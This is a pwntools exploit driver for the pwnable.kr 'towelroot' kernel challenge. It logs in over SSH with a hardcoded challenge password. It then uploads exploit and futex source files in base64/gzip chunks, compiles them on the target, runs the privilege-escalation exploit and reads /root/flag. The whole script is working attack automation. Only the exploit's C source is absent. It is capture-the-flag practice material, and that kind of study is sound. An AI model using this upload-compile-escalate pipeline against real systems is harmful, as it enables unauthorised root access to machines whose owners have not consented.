#!/usr/bin/env python3

import gzip

from pwn import *

if args.LOCAL:
    if args.GDB:
        shell = process("./debug.sh")
    else:
        shell = process("./run.sh")
else:
    shell = process('sshpass -p "Congratz!! addr_limit looks quite IMPORTANT now... huh?" ssh towelroot@pwnable.kr -p2222', shell=True)

# --- utils --- #
def do_command(shell: tube, cmd: bytes) -> bytes:
    shell.sendline(cmd)
    return shell.recvuntil(b"/ $ ", drop=True)

def upload_file(shell: tube, filename: bytes, data: bytes):
    for _ in range(0, len(data), 400):
        encoded_data = b64e(gzip.compress(data[_:_+400])).encode()
        do_command(shell, b'echo -n "%s" | base64 -d | gzip -d >> %s' % (encoded_data, filename))

def read_regex(shell: tube, regex: bytes) -> re.Match | None:
    return re.search(regex, shell.recvline_regex(regex))

def read_int_regex(shell: tube, regex: bytes) -> int:
    return int(read_regex(shell, regex).groups()[0], 16)

# output is sometimes out of order, this sleep + enter fixes it
shell.recvuntil(b"/ $")
sleep(1)
do_command(shell, b"stty -echo")

# --- exploit compilation --- #
info("uploading files...")
upload_file(shell, b"/tmp/exploit.c", Path("exploit.c").read_bytes())
upload_file(shell, b"/tmp/futex.c", Path("futex.c").read_bytes())
upload_file(shell, b"/tmp/futex.h", Path("futex.h").read_bytes())

output = do_command(shell, b"gcc -pthread -o /tmp/exploit -I/tmp /tmp/exploit.c /tmp/futex.c")
if output != b"":
    error("%s", output.decode())

# ------ exploit ------ #
do_command(shell, b"chmod +x /tmp/exploit")
shell.sendline(b"/tmp/exploit")
shell.sendline(b"cat /root/flag")

while True:
    line_ = shell.recvline()
    if line_.startswith(b"/ #"):
        break
    sys.stderr.buffer.write(line_)
    sys.stderr.flush()

success(f"flag = '{term.text.bold_italic_yellow(line_.removeprefix(b'/ #').decode().strip())}'")